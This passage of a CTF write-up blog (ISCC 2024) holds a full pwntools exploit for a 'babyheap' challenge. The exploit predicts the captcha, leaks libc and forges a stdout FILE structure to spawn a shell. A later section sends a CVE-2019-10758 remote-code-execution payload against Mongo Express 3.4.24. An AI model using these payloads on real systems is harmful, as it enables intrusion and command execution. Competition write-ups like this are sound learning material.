<h4 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h4><p>hint</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd24080b5.png" alt="image-20240525194630848"></p>
<p>两个文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd23dbe80.png" alt="image-20240525194804804"></p>
<p>研究一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">p=remote(<span class="string">&quot;xxxx&quot;</span>,[port])</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : p.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : p.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : p.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : p.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : p.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">iuu32 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">iuu64 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(p.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">uheap = <span class="keyword">lambda</span> : u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_rand_int</span>(<span class="params">start_num, end_num</span>):</span><br><span class="line">    rand_num = dll.rand() % (end_num - start_num + <span class="number">1</span>)</span><br><span class="line">    rand_num += start_num</span><br><span class="line">    <span class="keyword">return</span> rand_num</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_rand_even</span>(<span class="params">start_num, end_num</span>):</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">        rand_num = dll.rand() % (end_num - start_num + <span class="number">1</span>)</span><br><span class="line">        rand_num += start_num</span><br><span class="line">        <span class="keyword">if</span> (rand_num % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> rand_num</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_rand_string</span>(<span class="params">length</span>):</span><br><span class="line">    string_ascii = [<span class="number">48</span>, <span class="number">57</span>, <span class="number">65</span>, <span class="number">90</span>, <span class="number">97</span>, <span class="number">122</span>]</span><br><span class="line">    captcha = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        idx = get_rand_even(<span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">        captcha += <span class="built_in">chr</span>(get_rand_int(string_ascii[idx], string_ascii[idx + <span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">return</span> captcha</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">    sla(<span class="string">&quot;Please Select: &quot;</span>, <span class="built_in">str</span>(c).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_gift</span>(<span class="params">libc, is_recv=<span class="literal">True</span></span>):</span><br><span class="line">    cmd(<span class="number">114514</span>)</span><br><span class="line">    ru(<span class="string">&quot;Please enter the captcha: &quot;</span>)</span><br><span class="line">    gift = get_rand_string(<span class="number">0x10</span>)</span><br><span class="line">    sl(gift.encode())</span><br><span class="line">    <span class="keyword">if</span> is_recv:</span><br><span class="line">        ru(<span class="string">&quot;Give You: 0x&quot;</span>)</span><br><span class="line">        leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">2</span> * <span class="number">6</span>), <span class="number">16</span>)</span><br><span class="line">        info(<span class="string">&quot;leak_addr =&gt; 0x%x&quot;</span> %(leak_addr))</span><br><span class="line">        libc_base = leak_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">        info(<span class="string">&quot;libc_base =&gt; 0x%x&quot;</span> %(libc_base))</span><br><span class="line">        <span class="keyword">return</span> libc_base</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    sla(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    elf = ELF(<span class="string">&quot;./babyheap&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line">    captcha = get_rand_string(<span class="number">8</span>)</span><br><span class="line">    <span class="comment"># print(captcha)</span></span><br><span class="line">    ru(<span class="string">b&quot;To verify that you are AI. Enter the captcha: &quot;</span>)</span><br><span class="line">    sl(captcha.encode())</span><br><span class="line">    libc.address = get_gift(libc)</span><br><span class="line">    <span class="comment"># raw_input()</span></span><br><span class="line">    <span class="comment"># 7536 / 8 = 942</span></span><br><span class="line">    <span class="comment"># 7504 / 8 = 938</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x20</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x10</span>, p64(libc.sym[<span class="string">&#x27;__stdout_FILE&#x27;</span>]))</span><br><span class="line">    <span class="comment"># raw_input()</span></span><br><span class="line">    fake_IO = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    fake_IO += p64(<span class="number">0</span>)</span><br><span class="line">    fake_IO += p64(<span class="number">0</span>)</span><br><span class="line">    fake_IO += p64(libc.sym[<span class="string">&#x27;__stdio_close&#x27;</span>])</span><br><span class="line">    fake_IO += p64(<span class="number">1</span>)</span><br><span class="line">    fake_IO += p64(<span class="number">0</span>)</span><br><span class="line">    fake_IO += p64(<span class="number">0</span>)</span><br><span class="line">    fake_IO += p64(<span class="number">0</span>)</span><br><span class="line">    fake_IO += p64(<span class="number">0</span>)</span><br><span class="line">    fake_IO += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    edit(<span class="number">938</span>, <span class="built_in">len</span>(fake_IO), fake_IO)</span><br><span class="line">    get_gift(libc, <span class="literal">False</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    dll = cdll.LoadLibrary(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line">    t = <span class="built_in">int</span>(time.time())</span><br><span class="line">    seed = dll.srand(t - (t % <span class="number">100</span>))</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h2 id="实战题"><a href="#实战题" class="headerlink" title="实战题"></a>实战题</h2><h3 id="阶段一"><a href="#阶段一" class="headerlink" title="阶段一"></a>阶段一</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd25acdb9.png" alt="image-20240525142851001"></p>
<p>根据题目下载VPN</p>
<p>打开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd25c443c.png" alt="image-20240525160908716"></p>
<p>注册一个</p>
<p>？</p>
<p>注册不上</p>
<p>发了有可以用的账号</p>
<p>iscc20240513</p>
<p>Iscc@20240513</p>
<p>要配置default</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd25d96e8.png" alt="image-20240525162825854"></p>
<p>好 根据题目</p>
<p>访问172.17.0.1:8081</p>
<p>开题</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd2587643.png" alt="image-20240525162937551"></p>
<p>是Mongo Express，并且版本为3.4.24，这里有显示CVE-2019-10758，去搜一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd25aece9.png" alt="image-20240525163035521"></p>
<p>远程代码执行？</p>
<p>那就根据这篇文章打一下远程代码执行</p>
<p>直接post</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fd2566907.png" alt="image-20240525164427850"></p>
<blockquote>
<p>向<a target="_blank" rel="noopener" href="http://172.17.0.1:8081/checkValid%E5%8F%91%E5%8C%85">http://172.17.0.1:8081/checkValid发包</a></p>
<p>post:document&#x3D;this.constructor.constructor(“return process”)().mainModule.require(“child_process”).execSync(“touch &#x2F;tmp&#x2F;Success_Ozero”)</p>
<p>添加header:Authorization: Basic YWRtaW46cGFzcw&#x3D;&#x3D;</p>
</blockquote>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">VVkladg0r</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://cszvvds.cc/2024/05/25/ISCC-wp/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://cszvvds.cc/2024/05/25/ISCC-wp/')">ISCC-wp</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacae5439.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://cszvvds.cc/2024/05/25/ISCC-wp/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=ISCC-wp&amp;url=http://cszvvds.cc/2024/05/25/ISCC-wp/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://cszvvds.cc" target="_blank">VV</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/wp/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>wp<span class="tagsPageCount">7</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2024/05/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-URLDNS/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">java反序列化--URLDNS</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/05/15/2023-NKCTF-wp/" title="2023-NKCTF-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-15</div><div class="title">2023-NKCTF-wp</div></div></a></div><div><a href="/2024/05/15/2023-%E8%93%9D%E6%A1%A5%E6%9D%AF-wp/" title="2023-蓝桥杯-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-15</div><div class="title">2023-蓝桥杯-wp</div></div></a></div><div><a href="/2024/05/15/2023-%E7%AC%AC%E4%B8%80%E5%B1%8A%E2%80%9C%E5%B8%95%E9%B2%81%E6%9D%AF%E2%80%9DCTF-wp/" title="2023-第一届“帕鲁杯”CTF-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-15</div><div class="title">2023-第一届“帕鲁杯”CTF-wp</div></div></a></div><div><a href="/2024/05/13/2023-NewstarCTF-wp/" title="2023-NewstarCTF-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">2023-NewstarCTF-wp</div></div></a></div><div><a href="/2024/05/23/H&NCTF-wp/" title="h_nCTF-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-23</div><div class="title">h_nCTF-wp</div></div></a></div><div><a href="/2024/05/15/2023-XYCTF-wp/" title="2023-XYCTF-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-15</div><div class="title">2023-XYCTF-wp</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2021/03/03/e511960ac5488.png" alt="status"/></div></div><div class="author-info__description">生活明朗 万物可爱</div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">大家好 我是VV 欢迎来看我的博客鸭~  之前上传文章的时候 图床好像被DDOS了 有些图片没上传起 懒的重新弄了 大家需要的话d我 我重新上传</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ISCC-2024"><span class="toc-number">1.</span> <span class="toc-text">ISCC 2024</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">1.1.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E6%AD%A6%E9%A2%98"><span class="toc-number">1.1.1.</span> <span class="toc-text">练武题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FunZip"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">FunZip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Number-is-the-key"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">Number_is_the_key</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RSA-KU"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">RSA_KU</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E5%88%BA%E5%AE%A2"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">时间刺客</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%90%E8%AF%AD%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.1.1.5.</span> <span class="toc-text">成语学习</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E6%A8%A1%E6%8B%9F%E4%BB%BF%E7%9C%9F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.6.</span> <span class="toc-text">工业互联网模拟仿真数据分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B2%BE%E8%A3%85%E5%9B%9B%E5%90%88%E4%B8%80"><span class="toc-number">1.1.1.7.</span> <span class="toc-text">精装四合一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E4%BA%BA%E8%AE%A9%E6%88%91%E7%BB%99%E4%BD%A0%E5%B8%A6%E4%B8%AA%E8%AF%9D"><span class="toc-number">1.1.1.8.</span> <span class="toc-text">有人让我给你带个话</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%92%A2%E9%93%81%E4%BE%A0%E5%9C%A8%E8%A7%A3%E5%AF%86"><span class="toc-number">1.1.1.9.</span> <span class="toc-text">钢铁侠在解密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#magic-keyboard"><span class="toc-number">1.1.1.10.</span> <span class="toc-text">magic-keyboard</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%82%E5%8F%B0%E9%A2%98"><span class="toc-number">1.1.2.</span> <span class="toc-text">擂台题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E2%80%9C%E9%9A%90%E2%80%9D"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">重“隐”</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Listen-to-a-symphony"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">Listen_to_a_symphony</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#World-Line"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">World_Line</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">数据泄露</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RE"><span class="toc-number">1.2.</span> <span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E6%AD%A6%E9%A2%98-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">练武题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%B7%E5%A4%B1%E4%B9%8B%E9%97%A8"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">迷失之门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Badcode"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">Badcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DLLCode"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">DLLCode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CrypticConundrum"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">CrypticConundrum</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WinterBegins"><span class="toc-number">1.2.1.5.</span> <span class="toc-text">WinterBegins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Find-All"><span class="toc-number">1.2.1.6.</span> <span class="toc-text">Find_All</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#I-am-the-Mathematician"><span class="toc-number">1.2.1.7.</span> <span class="toc-text">I_am_the_Mathematician</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AI"><span class="toc-number">1.2.1.8.</span> <span class="toc-text">AI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Which-is-the-flag"><span class="toc-number">1.2.1.9.</span> <span class="toc-text">Which_is_the_flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%82%E5%8F%B0%E9%A2%98-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">擂台题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%81%AB%E7%9C%BC%E9%87%91%E7%9D%9B"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">火眼金睛</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#W2w"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">W2w</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ezjs"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">ezjs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ezobf"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">Ezobf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%BD%E5%AF%86%E9%98%B2%E7%BA%BF%E8%87%B3%E5%96%84%E4%B9%8B%E6%88%98"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">国密防线至善之战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.3.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E6%AD%A6%E9%A2%98-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">练武题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%98%E6%B2%A1%E6%83%B3%E5%A5%BD%E5%90%8D%E5%AD%97%E7%9A%84%E5%A1%94%E9%98%B2%E6%B8%B8%E6%88%8F"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">还没想好名字的塔防游戏</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flask%E4%B8%AD%E7%9A%84pin%E5%80%BC%E8%AE%A1%E7%AE%97"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">Flask中的pin值计算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%A5%9E%E5%90%AF%E5%8A%A8"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">原神启动</span></a></li><li 